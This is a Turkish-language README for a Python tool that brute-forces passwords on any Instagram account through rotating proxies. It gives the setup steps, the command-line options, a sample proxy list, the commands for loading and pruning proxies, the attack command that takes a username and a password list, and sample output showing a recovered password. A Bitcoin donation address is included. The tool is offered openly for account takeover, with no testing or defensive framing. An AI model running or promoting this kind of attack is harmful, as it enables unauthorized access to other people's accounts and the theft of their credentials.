# Instagram Brute Force Attacker

[![Version](https://img.shields.io/badge/Version-3.1.0-green)]()
[![Python](https://img.shields.io/badge/Python-v3.9-yellow)]()


Bu program, bir proxy listesi verildiğinde, gönderdiğiniz herhangi bir Instagram hesabına kaba kuvvet uygulayacaktır.

### Notlar

Bu küçük bir deneme projesidir, geliştirmeye devam edilmeyecektir.

### Mali Destek

Projeye destek olmak isterseniz

**Bitcoin Wallet:** 1A9V9srcmERCg5AvHtkRLb3DbZyu2PM9ic<br/>


## Gereksinimler

- Python _v3.9_
- proxy list

## Kurulum Gereksinimleri

### Pipenv Kurulumu

```
pip install pipenv
```

### Çalışma Ortamı

Python 3.9 kurulu olmalıdır

```
pipenv --python 3.9
```

### Kurulum Gereksinimleri

```
pipenv install
```

## Yardim

```
usage: instagram.py [-h] [-u Kullanici] [-p Şifre Listesi] [-px Proxy Listesi] [--prune ISTISNA] [--stats] [-nc] [-m MODE]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username KullaniciAdi
                        eposta veya kullanıcı adı
  -p PASSLIST, --passlist PASSLIST
                        şifre listesi
  -px PROXYLIST, --proxylist PROXYLIST
                        proxy listesi
  --prune PRUNE         Veritabanından çıkar
  --stats               proxy istatistikleri
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

## Proxy

Sistemin çalışması için bir proxy listesine ihtiyacı vardır. Proxy'ler yüklendikten sonra bir veritabanına kaydedilir.<br/>

### Upload

Programa "ip:port" şeklinde proxy listesi yüklenebilir<br/>
`proxies_list.txt`

```
51.79.248.208:28753
51.222.12.245:10084	
5.161.86.206:1080
66.42.224.229:41679
72.210.221.197:4145
184.178.172.25:15291
```

Yukarıda gösterildiği şekilde olmalıdır.

```
python instagram.py -px <proxy listesi>
```

### Durum

Veritabanında bulunan proxylerin çalışıp çalışmadığını gösterir

```
python instagram.py --stats
```

### Prune

Bellirlenen puanın altındaki proxylerin temizlenmesini sağlar

```
python instagram.py --prune 0.05
```

Prune zorunlu değil opsiyoneldir çünkü <br/>
sistem, hangi proxy'lerin düşük performans gösterdiğini otomatik olarak öğrenecek ve bunları kullanmayı bırakacaktır.

### Kullanım

```
python instagram.py -u <HesapAdi> -p <ŞifreListesi>
```

### Çalıştığında

```
[-] Wordlist: sifre.txt
[-] Username: xisouTest0.1
[-] Password: test1648
[-] Complete: 65.51%
[-] Attempts: 1228
[-] Browsers: 173
[-] Exists: True
```

### Tamamlandığında

```
[-] Wordlist: sifre.txt
[-] Username: xisouTest0.1
[-] Password: test1648
[-] Complete: 65.51%
[-] Attempts: 1228
[-] Browsers: 173
[-] Exists: True

[!]Şifre bulundu
[+] Username: xisouTest0.1
[+] Password: test1648
```
